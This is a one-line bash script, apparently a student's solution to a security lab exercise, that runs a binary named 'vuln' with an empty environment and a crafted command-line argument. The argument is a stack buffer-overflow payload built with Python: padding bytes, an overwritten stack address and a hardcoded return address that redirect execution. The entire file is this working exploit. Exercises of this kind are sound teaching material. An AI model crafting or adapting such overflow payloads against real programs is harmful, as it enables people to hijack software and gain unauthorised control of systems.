#!/usr/bin/env bash
env -i /task2/s2888144/vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xff"*1183 + b"\x70\xc8\xff\xff" + b"\xff"*24  + b"\xc6\x91\x04\x08")')
